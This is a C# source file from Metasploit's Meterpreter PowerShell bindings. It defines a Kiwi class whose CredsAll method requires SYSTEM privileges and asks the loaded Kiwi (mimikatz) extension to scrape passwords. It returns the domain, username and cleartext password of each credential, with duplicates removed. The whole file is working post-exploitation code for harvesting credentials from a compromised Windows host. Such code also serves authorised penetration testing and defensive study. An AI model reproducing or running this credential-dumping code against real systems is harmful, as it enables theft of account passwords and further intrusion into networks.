using System;
using System.Collections.Generic;
namespace MSF.Powershell.Meterpreter
{
    public static class Kiwi
    {
        public class Credential
        {
            public string Domain { get; set; }
            public string Username { get; set; }
            public string Password { get; set; }

            public override string ToString()
            {
                return string.Format("{0}|{1}|{2}", Password, Username, Domain);
            }
        }

        public static List<Credential> CredsAll()
        {
            System.Diagnostics.Debug.Write("[PSH BINDING] Invoking binding call CredsAll");

            if (!User.IsSystem())
            {
                throw new InvalidOperationException("Current session is not running as SYSTEM");
            }

            Tlv tlv = new Tlv();
            tlv.Pack(TlvType.KiwiPwdId, 0);

            var result = Core.InvokeMeterpreterBinding(true, tlv.ToRequest("kiwi_scrape_passwords"));

            var ids = new Dictionary<string, Credential>();

            if (result != null)
            {
                System.Diagnostics.Debug.Write("[PSH BINDING] Result returned, kiwi is probably loaded");
                var responseTlv = Tlv.FromResponse(result);
                if (responseTlv[TlvType.Result].Count > 0 &&
                    (int)responseTlv[TlvType.Result][0] == 0)
                {
                    foreach (var credObj in responseTlv[TlvType.KiwiPwdResult])
                    {
                        var credDict = (Dictionary<TlvType, List<object>>)credObj;
                        var credential = new Credential
                        {
                            Domain = Tlv.GetValue<string>(credDict, TlvType.KiwiPwdDomain, string.Empty),
                            Username = Tlv.GetValue<string>(credDict, TlvType.KiwiPwdUserName, string.Empty),
                            Password = Tlv.GetValue<string>(credDict, TlvType.KiwiPwdPassword, string.Empty)
                        };

                        if (!ids.ContainsKey(credential.ToString()))
                        {
                            ids.Add(credential.ToString(), credential);
                        }
                    }

                    return new List<Credential>(ids.Values);
                }
            }

            System.Diagnostics.Debug.Write("[PSH BINDING] Result not returned, kiwi is probably not loaded");
            throw new InvalidOperationException("Kiwi extension is not loaded");
        }
    }
}
